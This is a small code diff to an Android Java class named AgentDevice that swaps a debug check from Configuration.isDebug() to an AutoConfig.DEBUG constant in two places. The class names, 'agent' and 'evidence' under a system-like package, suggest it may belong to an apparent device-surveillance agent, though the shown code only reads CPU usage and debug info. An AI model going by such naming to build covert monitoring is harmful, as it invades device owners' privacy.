@@ -26,6 +26,7 @@ import android.util.Log;
 import com.android.service.Device;
 import com.android.service.LogR;
 import com.android.service.Status;
+import com.android.service.auto.AutoConfig;
 import com.android.service.conf.Configuration;
 import com.android.service.evidence.EvidenceType;
 import com.android.service.util.Utils;
@@ -101,7 +102,7 @@ public class AgentDevice extends AgentBase {
 		readCpuUsage();
 
 		final StringBuffer sb = new StringBuffer();
-		if(Configuration.isDebug()){
+		if(AutoConfig.DEBUG){
 			sb.append("Debug\n");
 			String timestamp = System.getProperty("build.timestamp");
 			if(timestamp!=null){
@@ -182,7 +183,7 @@ public class AgentDevice extends AgentBase {
 			this.cpuTotal = currTotal;
 			this.cpuIdle = currIdle;
 		} catch (final IOException ex) {
-			if(Configuration.isDebug()) { ex.printStackTrace(); }
+			if(AutoConfig.DEBUG) { ex.printStackTrace(); }
 		}
 	}
 
